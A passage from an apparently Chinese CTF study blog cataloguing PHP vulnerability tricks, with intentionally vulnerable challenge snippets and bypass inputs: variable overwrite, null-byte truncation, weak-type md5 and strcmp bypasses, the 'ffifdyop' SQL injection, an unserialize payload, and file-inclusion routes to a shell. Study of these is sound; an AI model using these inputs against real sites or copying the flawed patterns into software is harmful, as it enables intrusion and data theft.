class=\"php\">#?shiyan=&amp;flag=1\n&lt;?php\n$flag=&#39;xxx&#39;; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo &#39;ctf{xxx}&#39;; \n    }\n   else\n   { \n    echo&#39;Oh.no&#39;;\n   } \n   }\n</code></pre>\n<a id=\"more\"></a>\n<h3 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str()\"></a>parse_str()</h3><p>解析字符串并注册成变量</p>\n<pre><code class=\"php\">$b=1;\nParse_str(&#39;b=2&#39;);\nPrint_r($b);\n# 结果: $b=2\n</code></pre>\n<h3 id=\"import-request-variables\"><a href=\"#import-request-variables\" class=\"headerlink\" title=\"import_request_variables()\"></a>import_request_variables()</h3><pre><code class=\"php\">将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(&quot;p&quot;， &quot;post_&quot;);\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(&quot;gp&quot;， &quot;gp_&quot;);\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(&quot;cg&quot;， &quot;cg_&quot;);\n</code></pre>\n<h3 id=\"变量覆盖-1\"><a href=\"#变量覆盖-1\" class=\"headerlink\" title=\"$变量覆盖\"></a>$变量覆盖</h3><pre><code class=\"php\">## 提交参数chs，则可覆盖变量&quot;$chs&quot;的值。$key为chs时，$$key就变成$chs\n&lt;?  \n$chs = &#39;&#39;;  \nif($_POST &amp;&amp; $charset != &#39;utf-8&#39;){  \n    $chs = new Chinese(&#39;UTF-8&#39;, $charset);  \n    foreach($_POST as $key =&gt; $value){  \n        $$key = $chs-&gt;Convert($value);  \n    }  \n    unset($chs);  \n}\n</code></pre>\n<h3 id=\"全局变量覆盖漏洞\"><a href=\"#全局变量覆盖漏洞\" class=\"headerlink\" title=\"全局变量覆盖漏洞\"></a>全局变量覆盖漏洞</h3><p>原理：<br>register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。<br>如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>\n<p>\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>\n<pre><code class=\"php\">&lt;?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&amp;b=111\nif (ini_get(&quot;register_globals&quot;)) foreach($_REQUEST as $k=&gt;$v) unset(${$k});\nprint $a;\nprint $_GET[b];\n</code></pre>\n<p>经过测试，开了register_globals会卡死</p>\n<h2 id=\"绕过过滤的空白字符\"><a href=\"#绕过过滤的空白字符\" class=\"headerlink\" title=\"绕过过滤的空白字符\"></a>绕过过滤的空白字符</h2><p>原理：<a href=\"https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>\n<pre><code>控制码\n&quot;\\0&quot; &quot;%00&quot; (ASCII  0 (0x00))，空字节符。\n\n制表符\n&quot;\\t&quot; (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n&quot;\\n&quot; (ASCII 10 (0x0A))，换行符。\n&quot;\\v&quot; &quot;\\x0b&quot; (ASCII  11 (0x0B))，垂直制表符。\n&quot;\\f&quot; &quot;%0c&quot; 换页符\n&quot;\\r&quot; &quot;%0d&quot;(ASCII  13 (0x0D))，回车符。\n\n空格:\n&quot; &quot; &quot;%20&quot; (ASCII  32 (0x20))，普通空格符。\n</code></pre><p>而trim过滤的空白字符有</p>\n<pre><code class=\"php\">string trim ( string $str [, string $character_mask = &quot; \\t\\n\\r\\0\\x0B&quot; ] )\n</code></pre>\n<p>其中缺少了\\f</p>\n<p>2 函数对空白字符的特性<br>is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。<br>也就是说，is_numeirc(“ \\r\\n \\t 1.2”)是会返回true的。同理，intval(“ \\r\\n \\t 12”)，也会正常返回12。</p>\n<p>案例</p>\n<p><a href=\"https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a></p>\n<pre><code class=\"php\">#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n</code></pre>\n<h2 id=\"intval整数溢出\"><a href=\"#intval整数溢出\" class=\"headerlink\" title=\"intval整数溢出\"></a>intval整数溢出</h2><p>php整数上限溢出绕过intval</p>\n<p>intval 函数最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>\n<h2 id=\"intval-四舍五入\"><a href=\"#intval-四舍五入\" class=\"headerlink\" title=\"intval 四舍五入\"></a>intval 四舍五入</h2><pre><code class=\"php\"># ?a=1024.1\n&lt;?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));\nif ($_GET[id]==1024) {\n    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;\n    }\n  else{\n    echo($query[content]);\n  }\n}\n</code></pre>\n<h2 id=\"浮点数精度忽略\"><a href=\"#浮点数精度忽略\" class=\"headerlink\" title=\"浮点数精度忽略\"></a>浮点数精度忽略</h2><pre><code class=\"php\">if ($req[&quot;number&quot;] != intval($req[&quot;number&quot;]))\n</code></pre>\n<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。<br>输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>\n<h2 id=\"多重加密\"><a href=\"#多重加密\" class=\"headerlink\" title=\"多重加密\"></a>多重加密</h2><p>题目中有：</p>\n<pre><code class=\"php\">$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));\nif($login[&#39;user&#39;] === &#39;ichunqiu&#39;){echo $flag;}\n</code></pre>\n<p>本地则写：</p>\n<pre><code class=\"php\">&lt;?php\n$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?&gt;\n</code></pre>\n<h2 id=\"截断\"><a href=\"#截断\" class=\"headerlink\" title=\"截断\"></a>截断</h2><h3 id=\"iconv-异常字符截断\"><a href=\"#iconv-异常字符截断\" class=\"headerlink\" title=\"iconv 异常字符截断\"></a>iconv 异常字符截断</h3><pre><code class=\"php\">## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a=&#39;1&#39;.char(130).&#39;2&#39;;\necho iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a); //将字符串的编码从UTF-8转到gbk\necho iconv(&#39;GB2312&#39;, &#39;UTF-8&#39;, $str); //将字符串的编码从GB2312转到UTF-8\n</code></pre>\n<h3 id=\"eregi、ereg可用-00截断\"><a href=\"#eregi、ereg可用-00截断\" class=\"headerlink\" title=\"eregi、ereg可用%00截断\"></a>eregi、ereg可用%00截断</h3><p>功能：正则匹配过滤<br>条件：要求php&lt;5.3.4</p>\n<pre><code class=\"php\">## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n&lt;?php\nif (isset ($_GET[&#39;password&#39;])) {\n    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;,$_GET[&#39;password&#39;]) === FALSE)    \n       {\n        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;\n    }\n    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)\n    {\n        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)\n        {\n            die(&#39;Flag: &#39; . $flag);\n        }\n        else\n        {\n            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);\n        }\n    }\n    else\n    {\n        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;\n    }\n}\n</code></pre>\n<h3 id=\"move-uploaded-file-用-0截断\"><a href=\"#move-uploaded-file-用-0截断\" class=\"headerlink\" title=\"move_uploaded_file 用\\0截断\"></a>move_uploaded_file 用\\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生<br>cve：<br><a href=\"https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\" target=\"_blank\" rel=\"noopener\">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>\n<p><code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\\x00.jpg&quot;)</code><br>上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>\n<h3 id=\"include用？截断\"><a href=\"#include用？截断\" class=\"headerlink\" title=\"include用？截断\"></a>include用？截断</h3><pre><code class=\"php\">&lt;?php\n$name=$_GET[&#39;name&#39;];  \n$filename=$name.&#39;.php&#39;;  \ninclude $filename;  \n?&gt;\n</code></pre>\n<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br>测试POC：<br><a href=\"http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?</a><br>则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>\n<h3 id=\"系统长度截断\"><a href=\"#系统长度截断\" class=\"headerlink\" title=\"系统长度截断\"></a>系统长度截断</h3><p>这种方式在PHP5.3以后的版本中都已经得到了修复。<br>win260个字符，linux下4*1024=4096字节</p>\n<h3 id=\"mysql长度截断\"><a href=\"#mysql长度截断\" class=\"headerlink\" title=\"mysql长度截断\"></a>mysql长度截断</h3><p>mysql内的默认字符长度为255，超过的就没了。<br>由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>\n<h3 id=\"mysql中utf-8截断\"><a href=\"#mysql中utf-8截断\" class=\"headerlink\" title=\"mysql中utf-8截断\"></a>mysql中utf-8截断</h3><p><code>insert into dvwa.test values (14,concat(&quot;admin&quot;,0xc1,&quot;abc&quot;))</code></p>\n<p>写入为admin</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><p>原理</p>\n<p>比较表：<a href=\"http://php.net/manual/zh/types.comparisons.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/types.comparisons.php</a></p>\n<p>以下等式会成立</p>\n<pre><code class=\"php\">&#39;&#39; == 0 == false\n&#39;123&#39; == 123\n&#39;abc&#39; == 0\n&#39;123a&#39; == 123\n&#39;0x01&#39; == 1\n&#39;0e123456789&#39; == &#39;0e987654321&#39;\n[false] == [0] == [NULL] == [&#39;&#39;]\nNULL == false == 0\ntrue == 1\n</code></pre>\n<h3 id=\"、-gt-、-lt-的弱类型比较\"><a href=\"#、-gt-、-lt-的弱类型比较\" class=\"headerlink\" title=\"==、&gt;、&lt;的弱类型比较\"></a>==、&gt;、&lt;的弱类型比较</h3><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>\n<pre><code class=\"php\">##方法1\n##$a[&quot;a1&quot;]=&quot;1e8%00&quot;;\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[&quot;a1&quot;]=[&quot;a&quot;];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[&quot;a1&quot;]=1337a;\n##1337a过is_numeric，又由&gt;转成1337与1336比较\n&lt;?php\nis_numeric(@$a[&quot;a1&quot;])?die(&quot;nope&quot;):NULL;    \nif(@$a[&quot;a1&quot;]){\n        var_dump($a);\n        ($a[&quot;a1&quot;]&gt;1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n</code></pre>\n<h3 id=\"switch-弱类型\"><a href=\"#switch-弱类型\" class=\"headerlink\" title=\"switch 弱类型\"></a>switch 弱类型</h3><pre><code class=\"php\">// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) &quot;1[]&quot;,但在switch那里为1\nif (isset($_GET[&#39;x1&#39;]))\n{ \n        $x1 = $_GET[&#39;x1&#39;]; \n        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n</code></pre>\n<h3 id=\"md5比较（0e相等、数组为Null）\"><a href=\"#md5比较（0e相等、数组为Null）\" class=\"headerlink\" title=\"md5比较（0e相等、数组为Null）\"></a>md5比较（0e相等、数组为Null）</h3><pre><code class=\"php\">md5(&#39;240610708&#39;) //0e462097431906509019562988736854\nmd5(&#39;QNKCDZO&#39;) //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5(&#39;240610708&#39;)==md5(&#39;QNKCDZO&#39;); //True\nmd5(&#39;240610708&#39;)===md5(&#39;QNKCDZO&#39;); //False\n\n这样的对应数值还有：\nvar_dump(md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;));\nvar_dump(md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;));\nvar_dump(sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;));\nvar_dump(sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;));\nvar_dump(&#39;0010e2&#39; == &#39;1e3&#39;);\nvar_dump(&#39;0x1234Ab&#39; == &#39;1193131&#39;);\nvar_dump(&#39;0xABCdef&#39; == &#39; 0xABCdef&#39;);\n</code></pre>\n<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>\n<pre><code class=\"php\">#方法1\n#s1=QNKCDZO&amp;s2=240610708\n#方法2\n#?s1[]=1&amp;s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])\ndefine(&#39;FLAG&#39;, &#39;pwnhub{THIS_IS_FLAG}&#39;);\nif ($_GET[&#39;s1&#39;] != $_GET[&#39;s2&#39;]\n&amp;&amp; md5($_GET[&#39;s1&#39;]) == md5($_GET[&#39;s2&#39;])) {\necho &quot;success, flag:&quot; . FLAG;\n}\n</code></pre>\n<pre><code class=\"php\">##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST[&#39;name&#39;]);\n$r = $db-&gt;get_row(&quot;SELECT `pass` FROM `user` WHERE `name`=&#39;{$name}&#39;&quot;);\nif ($r[&#39;pass&#39;] === md5($_POST[&#39;pass&#39;])) {\necho &quot;success&quot;;\n}\n</code></pre>\n<h3 id=\"json传数据-“key”-0\"><a href=\"#json传数据-“key”-0\" class=\"headerlink\" title=\"json传数据{“key”:0}\"></a>json传数据{“key”:0}</h3><p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。</p>\n<pre><code>application/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n</code></pre><p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>\n<p>{“key”:”0”}</p>\n<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>\n<p>{“key”:0}</p>\n<h3 id=\"strcmp漏洞1：返回0\"><a href=\"#strcmp漏洞1：返回0\" class=\"headerlink\" title=\"strcmp漏洞1：返回0\"></a>strcmp漏洞1：返回0</h3><p>适用与5.3之前版本的php</p>\n<p><code>int strcmp ( string $str1 , string $str2 )</code><br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>\n<pre><code class=\"php\">##flag[]=admin\ndefine(&#39;FLAG&#39;, &#39;pwnhub{THIS_IS_FLAG}&#39;);\nif (strcmp($_GET[&#39;flag&#39;], FLAG) == 0) {\necho &quot;success, flag:&quot; . FLAG;\n}\n</code></pre>\n<h3 id=\"strcmp漏洞2：返回Null\"><a href=\"#strcmp漏洞2：返回Null\" class=\"headerlink\" title=\"strcmp漏洞2：返回Null\"></a>strcmp漏洞2：返回Null</h3><p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。<br>array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。<br><code>strcmp($c[1],$d)</code></p>\n<h3 id=\"strcmp漏洞3-判断使用的是\"><a href=\"#strcmp漏洞3-判断使用的是\" class=\"headerlink\" title=\"strcmp漏洞3: 判断使用的是 ==\"></a>strcmp漏洞3: 判断使用的是 ==</h3><p>而判断使用的是==，当NULL==0是 bool(true)</p>\n<h3 id=\"in-array，array-search-弱类型比较\"><a href=\"#in-array，array-search-弱类型比较\" class=\"headerlink\" title=\"in_array，array_search 弱类型比较\"></a>in_array，array_search 弱类型比较</h3><p>松散比较下，任何string都等于true：</p>\n<pre><code class=\"php\">// in_array(&#39;a&#39;, [true, &#39;b&#39;, &#39;c&#39;])       // 返回bool(true)，相当于数组里面有字符&#39;a&#39;\n// array_search(&#39;a&#39;, [true, &#39;b&#39;, &#39;c&#39;])   // 返回int(0)，相当于找到了字符&#39;a&#39;\n// array_search 会使用&#39;ctf&#39;和array中的每个值作比较，这里的比较也是弱比较，所以intval(&#39;ctf&#39;)==0.\nif(is_array(@$a[&quot;a2&quot;])){\n        if(count($a[&quot;a2&quot;])!==5 OR !is_array($a[&quot;a2&quot;][0])) die(&quot;nope&quot;);\n        $pos = array_search(&quot;ctf&quot;, $a[&quot;a2&quot;]);\n        $pos===false?die(&quot;nope&quot;):NULL;\n        foreach($a[&quot;a2&quot;] as $key=&gt;$val){\n            $val===&quot;ctf&quot;?die(&quot;nope&quot;):NULL;\n        }\n        $v2=1;\n}\n</code></pre>\n<h3 id=\"sha1-md5-报错相等绕过（False-False）\"><a href=\"#sha1-md5-报错相等绕过（False-False）\" class=\"headerlink\" title=\"sha1() md5() 报错相等绕过（False === False）\"></a>sha1() md5() 报错相等绕过（False === False）</h3><p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false<br>md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。</p>\n<pre><code class=\"php\">##?name[]=1&amp;password[]=2\n## === 两边都是false则成立\nif ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])\n    echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;\nelse if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))\n    die(&#39;Flag: &#39;.$flag);\n</code></pre>\n<h3 id=\"strpos数组NULL-Null-False\"><a href=\"#strpos数组NULL-Null-False\" class=\"headerlink\" title=\"strpos数组NULL(Null !== False)\"></a>strpos数组NULL(Null !== False)</h3><p>strpos()输入数组出错返回null</p>\n<pre><code class=\"php\">#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n&lt;?php\n$flag = &quot;flag&quot;;\n    if (isset ($_GET[&#39;nctf&#39;])) {\n        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE) # %00截断\n            echo &#39;必须输入数字才行&#39;;\n        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   \n            die(&#39;Flag: &#39;.$flag);\n        else\n            echo &#39;骚年，继续努力吧啊~&#39;;\n    }\n</code></pre>\n<h3 id=\"十六进制与十进制比较\"><a href=\"#十六进制与十进制比较\" class=\"headerlink\" title=\"十六进制与十进制比较\"></a>十六进制与十进制比较</h3><p>== 两边的十六进制与十进制比较，是可以相等的。</p>\n<pre><code class=\"php\">#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n&lt;?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = &#39;flag{test}&#39;;\n    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值\n    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值\n    $number = &#39;3735929054&#39;;\n    // Check all the input characters!\n    for ($i = 0; $i &lt; strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return &quot;flase&quot;;\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET[&#39;password&#39;];\necho noother_says_correct($temp);\n</code></pre>\n<h2 id=\"md5注入带入’or’\"><a href=\"#md5注入带入’or’\" class=\"headerlink\" title=\"md5注入带入’or’\"></a>md5注入带入’or’</h2><p>原理：</p>\n<pre><code class=\"php\">md5(string,raw)\nraw    可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n</code></pre>\n<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>&#39;or&#39;&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。</p>\n<pre><code class=\"php\">## 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`&#39;or&#39;&lt;trash&gt;`-&gt;sql执行`&#39;or&#39;&lt;trash&gt;`造成注入\n$sql = &quot;SELECT * FROM admin WHERE username = admin pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;\n</code></pre>\n<h2 id=\"switch没有break\"><a href=\"#switch没有break\" class=\"headerlink\" title=\"switch没有break\"></a>switch没有break</h2><pre><code class=\"php\">#这里case 0 和 1 没有break,使得程序继续往下执行。\n&lt;?php\nerror_reporting(0);\nif (isset($_GET[&#39;which&#39;]))\n{\n    $which = $_GET[&#39;which&#39;];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.&#39;.php&#39;;\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);\n        break;\n    }\n}\n</code></pre>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><pre><code class=\"php\">&lt;!-- index.php --&gt;\n&lt;?php \n    require_once(&#39;shield.php&#39;);\n    $x = new Shield();\n    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];\n    if (!empty($g)) {\n        $x = unserialize($g);\n    }\n    echo $x-&gt;readfile();\n?&gt;\n&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;\n&lt;!-- shield.php --&gt;\n&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &#39;&#39;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;\n&lt;!-- showimg.php --&gt;\n&lt;?php\n    $f = $_GET[&#39;img&#39;];\n    if (!empty($f)) {\n        $f = base64_decode($f);\n        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\\\&#39;)===FALSE\n        //stripos — 查找字符串首次出现的位置（不区分大小写）\n        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {\n            readfile($f);\n        } else {\n            echo &quot;File not found!&quot;;\n        }\n    }\n?&gt;\n</code></pre>\n<pre><code class=\"php\">#?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}\n&lt;!-- answer.php --&gt;\n&lt;?php\n\nrequire_once(&#39;shield.php&#39;);\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?&gt;\n\n&lt;!-- shield.php --&gt;\n&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &#39;pctf.php&#39;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;\n</code></pre>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>原理：</p>\n<p>include()/include_once()，require()/require_once()，中的变量可控</p>\n<p>利用过程：</p>\n<pre><code>上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n</code></pre><p>封闭协议：</p>\n<pre><code>file:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n</code></pre><pre><code class=\"php\">## 访问共享目录\ninclude (&#39;\\evilservershell.php&#39;);\n</code></pre>\n<h2 id=\"提交参数无过滤\"><a href=\"#提交参数无过滤\" class=\"headerlink\" title=\"提交参数无过滤\"></a>提交参数无过滤</h2><p>原理:过滤了GPC，但没有过滤其它部分。</p>\n<pre><code class=\"bash\">上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n</code></pre>\n<p>案例：</p>\n<pre><code class=\"php\">foreach($_COOKIE AS $_key=&gt;$_value){\n    unset($$_key);\n}\nforeach($_POST AS $_key=&gt;$_value){\n    !ereg(&quot;^\\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=&gt;$_value){\n    